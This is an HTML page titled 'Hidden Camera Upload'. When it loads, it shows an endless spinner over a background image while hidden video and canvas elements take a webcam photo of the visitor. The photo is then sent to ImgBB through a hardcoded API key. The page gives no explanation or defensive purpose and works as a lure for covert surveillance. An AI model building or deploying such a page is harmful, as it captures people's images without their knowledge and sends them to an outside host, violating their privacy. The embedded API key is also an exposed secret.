<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Hidden Camera Upload</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      background-image: url('R.jpeg');
      background-size: cover;
      background-position: center;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    #loader-wrapper {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.3); /* نیمه شفاف */
      display: none;
      align-items: center;
      justify-content: center;
    }

    #loader {
      border: 10px solid #f3f3f3;
      border-top: 10px solid #3498db;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    video, canvas { display: none; }
  </style>
</head>
<body>

  <div id="loader-wrapper">
    <div id="loader"></div>
  </div>

  <video id="video" width="320" height="240" autoplay></video>
  <canvas id="canvas" width="320" height="240"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const loaderWrapper = document.getElementById('loader-wrapper');

    function startCamera() {
      loaderWrapper.style.display = 'flex';

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;

          setTimeout(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());

            const imageData = canvas.toDataURL('image/jpeg');
            uploadToImgBB(imageData);
          }, 2000);
        })
        .catch(err => {
          console.error("Camera error:", err);
         // loaderWrapper.style.display = 'none';
        });
    }

    function uploadToImgBB(imageData) {
      const formData = new FormData();
      formData.append("image", imageData.split(',')[1]);

      fetch("https://api.imgbb.com/1/upload?key=6f1ad0885f26436ba1315c5ce76d13ad", {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        console.log("✅ Uploaded to ImgBB:", data.data.url);
        //loaderWrapper.style.display = 'none';
      })
      .catch(err => {
        console.error("❌ Upload failed:", err);
       // loaderWrapper.style.display = 'none';
      });
    }

    window.onload = startCamera;
  </script>

</body>
</html>
